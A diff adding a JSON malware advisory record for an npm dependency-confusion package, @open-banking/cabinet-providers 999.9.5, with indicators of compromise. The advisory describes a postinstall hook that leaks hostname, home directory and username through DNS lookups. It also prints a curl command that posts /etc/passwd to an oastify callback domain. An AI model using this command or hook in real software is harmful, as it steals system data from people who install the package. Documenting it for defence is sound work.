@@ -1,0 +1,58 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-1187",
+  "aliases": [
+    "MAL-2026-5392"
+  ],
+  "modified": "2026-05-29T21:46:16Z",
+  "published": "2026-05-29T10:16:40Z",
+  "summary": "Security-research / proof-of-concept package: @open-banking/cabinet-providers (npm)",
+  "details": "Dependency confusion stub (version 999.9.5, 820 bytes, scoped name shadowing @open-banking/cabinet-providers) with postinstall hook that exfiltrates system data to oastify[.]com attacker-controlled callback domain via two vectors: (1) node scripts/scream3gg.js hex-encodes hostname/homedir/username and sends each as DNS labels to nmd25sur8sjp60lm75dp67e2gtmkaayz[.]oastify[.]com, (2) curl --data '@/etc/passwd' $(hostname).200hj786m7x4kfz1lkr4kmshu80zoqcf[.]oastify[.]com exfils the passwd file. Publisher is a throwaway iCloud identity. This is a dependency confusion supply-chain attack with data exfiltration — recommend immediate human writeup. A finance-themed stub in the @open-banking scope (version 999.9.5, ~820 bytes, two files, published one day after account creation). Its postinstall script runs scripts/scream3gg.js, which hex-encodes hostname/homedir/username and exfiltrates them as DNS subdomains to nmd25sur8sjp60lm75dp67e2gtmkaayz[.]oastify[.]com, then runs curl --data '@/etc/passwd' to $(hostname).200hj786m7x4kfz1lkr4kmshu80zoqcf[.]oastify[.]com, exfiltrating /etc/passwd. A two-stage credential and system-data exfiltration payload.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@open-banking/cabinet-providers",
+        "purl": "pkg:npm/%40open-banking/cabinet-providers@999.9.5"
+      },
+      "versions": [
+        "999.9.5"
+      ],
+      "database_specific": {
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@open-banking/cabinet-providers/v/999.9.5"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-1187"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "research_poc",
+      "first_seen_at": "2026-05-29T10:16:40Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "200hj786m7x4kfz1lkr4kmshu80zoqcf[.]oastify[.]com",
+          "nmd25sur8sjp60lm75dp67e2gtmkaayz[.]oastify[.]com",
+          "oastify[.]com"
+        ]
+      }
+    }
+  }
+}
